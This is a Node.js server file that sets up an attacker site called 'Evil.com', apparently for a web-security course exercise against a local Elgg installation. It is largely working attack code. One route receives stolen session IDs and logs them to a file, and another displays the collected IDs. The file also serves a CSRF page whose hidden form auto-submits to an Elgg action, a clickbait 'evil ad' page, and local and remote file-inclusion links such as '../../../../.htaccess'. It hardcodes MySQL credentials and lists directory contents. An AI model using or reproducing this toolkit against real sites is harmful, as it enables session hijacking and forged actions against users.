// We need an http server
var http = require('http'),
	url = require('url'),
    fs = require('fs'),
    mysqlObj = require('mysql'),
    path = require('path'),
    qs = require('querystring'); 

//Count the number of visits to the page
var countVisit = 0;

var mimeTypes = {
    "html": "text/html",
    "jpeg": "image/jpeg",
    "jpg": "image/jpeg",
    "png": "image/png",
    "js": "application/javascript",
    "css": "text/css"};


//Create an http Server
http.createServer(function (req, res) {

	//Check if request is not for favicon
	if(req.url!="/favicon.ico"){
		//increment the counter
		countVisit++;

	}else{
		res.end();
	}
	//Start creating response
    
    var urlObj = url.parse(req.url);
    //Get the page html    
    switch(urlObj.pathname){
    	case 'favicon.ico':
    		res.end();
    		break;
        case "/":
            res.writeHead(200, {'Content-Type': 'text/html'});
            var html = getHomePageHtmlCode();
            res.write(html);
            res.end();
            break;
        case "/fileList":

            fs.readdir("c:/",function(err,files){
                res.writeHead(200, {'Content-Type': 'text/html'});
                var html = getFileListHtml(files);
                res.write(html);
                res.end();
            });

            
            break;

        case "/tableList":

            var connection = mysqlObj.createConnection({
              host     : 'localhost',
              user     : 'naman',
              password : 'IAMTHEBEST'
            });

            connection.connect();

            connection.query('SELECT * from elgg.attack', function(err, rows, fields) {
              if (err) throw err;

              res.writeHead(200, {'Content-Type': 'text/html'});
              var html = getTableListHtml(rows);
              res.write(html);              
              res.end();
            });

            connection.end();
            

            break;
    	case "/myprof":    		
  			var getdata = qs.parse(urlObj.query);
            var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
            log.write(new Date().getTime()+"::"+getdata.c+"~");
            var refUrl = url.parse(req.headers.referer);
            if(!refUrl){
                var hostname = "localhost";
            }else{
                var hostname = refUrl.hostname;
            }
            
    		res.writeHead(302,{Location: 'http://'+hostname+'/elgg/pg/profile/attack1'});
    		res.end();
    		break;
		case "/evilad":
				var html = getEvilAdHtmlCode();
                    
                    //Start creating response
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.write(html);
                    res.end();        
			break;

        case "/csrfattack":
                var html = getCSRFHtmlCode();
                    
                    //Start creating response
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.write(html);
                    res.end();        
            break;
        case "/getsessionid":
            fs.readFile('sessionid.txt',function(err,data){

                if(err){
                    res.write("Some error occured");
                    res.end();        
                }else{
                    var html = getSessionHtmlCode(data);
                    
                    //Start creating response
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.write(html);
                    res.end();        
                }
            });
            
            break;
        case "/writetofile":        
        var log = fs.createWriteStream('log.txt', {'flags': 'a'});    
        log.write("this is a message\n");
        log.close();
        res.end("written");
    	default:
            var uri = url.parse(req.url).pathname;
            var filename = path.join(process.cwd(), uri);            
            path.exists(filename, function(exists) {                
                if(!exists) {
                    res.writeHead(404);
                    res.end("Page you are looking for is not here");
                    res.end();
                    return;
                }
                var mimeType = mimeTypes[path.extname(filename).split(".")[1]];                
                res.setHeader('content-type', mimeType);
                res.writeHead(200);

                var fileStream = fs.createReadStream(filename);
                fileStream.pipe(res);
                

            }); //end path.exists   		    		
    		break;

    }   
}).listen(1338, '0.0.0.0'); // Http server at port 1337 on localhost
//Log that server is running
console.log('Server running at http://127.0.0.1:1338/');


function getSessionHtmlCode(data){

    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';
    str += '<script type="text/javascript" src="sessionid.js"></script>';
    str += '</head>';
    str += '<body>';
    str += '<div style="display:none" id="hdnSession">';
    str += data;
    str += '</div>';
    str += '<table id="myTab" border="1">';
    str += '<tr>';
    str += '<th>Timestamp</th>';
    str += '<th>Session ID</th>';
    str += '</tr>';
    str += '</table>';
    str += '</body>    ';
    str += '</html>';
    return str;
}

function getEvilAdHtmlCode(){
   var str = '';   
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';
    str += '<script type="text/javascript" src="evilad.js"></script>';
    str += '</head>';
    str += '<body bgcolor="blue">';
    str += '<br>';
    str += '<div align="center" class="test"><blink> WIN $5000 IN 5 MINUTES! WANT TO KNOW HOW?</blink>';
    str += '<input type="button" value="CLICK HERE!" id="adclickbutton" onclick="postmessagetoparent()"/></div>';
    str += '</body>';
    str += '</html>';
    return str;

}


function getHomePageHtmlCode(){
    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<link rel="stylesheet" href="home.css" />';
    str += '<script type="text/javascript" src="jquery.js"></script>';    
    str += '</head>';
    str += '<body>';
    str += '<div>';
    str += '<h1>';
    str += 'Welcome to Evil.com';
    str += '</h1>';
    str += '</div>';

    str += '<div id="cont">';
    
    str += '<a href="/getsessionid" class="mylink">';
    str += '<div class="title">';
    str += 'Session IDs';
    str += '</div>';
    str += '<div class="desc">';
    str += 'See session ids of collected users';
    str += '</div>';
    str += '</a>';

    str += '<a href="/fileList" class="mylink">';
    str += '<div class="title">';
    str += 'File List';
    str += '</div>';
    str += '<div class="desc">';
    str += 'See File list of /tmp';
    str += '</div>';
    str += '</a>';

    str += '<a href="/tableList" class="mylink">';
    str += '<div class="title">';
    str += 'Table Select';
    str += '</div>';
    str += '<div class="desc">';
    str += 'See Contents of elgg.attack';
    str += '</div>';
    str += '</a>';


    str += '<a href="/evilad" class="mylink">';
    str += '<div class="title">';
    str += 'Evil Advertisment';
    str += '</div>';
    str += '<div class="desc">';
    str += 'Check out the evil ad';
    str += '</div>';
    str += '</a>';

    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=../../../../.htaccess" class="mylink">';
    str += '<div class="title">';
    str += 'Local File Include';
    str += '</div>';
    str += '<div class="desc">';
    str += 'Modifying the query parameter exposes .htaccess';
    str += '</div>';
    str += '</a>';

    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=http://code.jquery.com/jquery-1.11.0.min.js" class="mylink">';
    str += '<div class="title">';
    str += 'Remote File Include';
    str += '</div>';
    str += '<div class="desc">';
    str += 'Modifying the query parameter displays external file jquery.js';
    str += '</div>';
    str += '</a>';

    str += '</div>';
    str += '</body>    ';
    str += '</html>';
    return str;

}

function getFileListHtml(data){

    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';    
    str += '</head>';
    str += '<body>';    
    str += '<table id="myTab" border="1">';
    str += '<tr>';    
    str += '<th>FileName</th>';
    str += '</tr>';

    for(var i in data){

        str += '<tr>';    
        str += '<td>'+data[i]+'</td>';
        str += '</tr>';

    }

    str += '</table>';
    str += '</body>';
    str += '</html>';
    return str;

}



function getTableListHtml(data){

    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';    
    str += '</head>';
    str += '<body>';    
    str += '<table id="myTab" border="1">';
    str += '<tr>';    
    str += '<th>Id</th>';
    str += '<th>Name</th>';
    str += '</tr>';

    for(var i in data){

        str += '<tr>';    
        str += '<td>'+data[i].id+'</td>';
        str += '<td>'+data[i].name+'</td>';
        str += '</tr>';

    }

    str += '</table>';
    str += '</body>';
    str += '</html>';
    return str;

}


function getCSRFHtmlCode(){

var str = "";
str += '<html>';
str += '<head>';
str += '</head>';
str += '<body bgcolor="black" onload="setTimeout(\'document.events.submit();\',5000);">';
str += '<center>';
str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
str += '</center>';
str += '<form name="events" action="http://localhost/elgg/action/google_integration/add" method="POST">        ';
str += '<input type="hidden" name="ename" value="Attack"/>';
str += '<input type="hidden" name="esdate" value="2014-03-29"/>';
str += '<input type="hidden" name="eedate" value="2014-03-29"/>';
str += '<input type="hidden" name="estime" value="00:00"/>';
str += '<input type="hidden" name="eetime" value="00:00"/>';
str += '<input type="hidden" name="eloc" value="My Hacker Place"/>';
str += '<input type="hidden" name="etext" value="You are CSRF Attacked"/>        ';
str += '</form> ';
str += '</body>';
str += '</html>';

return str;
}


